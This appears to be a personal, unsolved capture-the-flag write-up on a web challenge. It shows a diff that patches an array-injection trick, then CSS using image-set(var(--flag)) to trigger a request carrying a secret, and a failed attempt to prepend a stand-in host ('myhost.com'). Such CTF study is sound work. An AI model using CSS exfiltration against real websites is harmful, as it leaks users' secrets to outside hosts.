---
created: 2026-03-14T10:31
updated: 2026-03-15T01:15
tags:
  - unsolved
---

Running a diff between the old version and the revenge version reveals that the old array hack won't work anymore.

```diff
diff --color -r old/web/index.js new/web/index.js
29c29,30
<     if (sep.length > 2) sep = "";
---
>     if (typeof sep !== "string" || sep.length > 2) sep = "";
>     if (typeof css !== "string") css = "";
```

After hours of searching, I found this.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1773528888/20260314185447675.png/85d84e8d7d5778820e4cd0a22af4053e.png)

Which resulted in this

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <style>
      :root {
        --flag: "abcc";
      }
      body {
        background-image: image-set(var(--flag) 1x);
        background-image: image-set(var(--flag));
      }
    </style>
  </head>
  <body>
    <h1>Capture The 🚩!</h1>
  </body>
</html>
```

This makes a web request based on `--flag`.

However couldn't go any further, string concat don't work in CSS.

And attempts results in

```
"http://myhost.com?""flag{abc}"
```

(with the quotation marks literally in the css var)

And background-image doesn't like it.
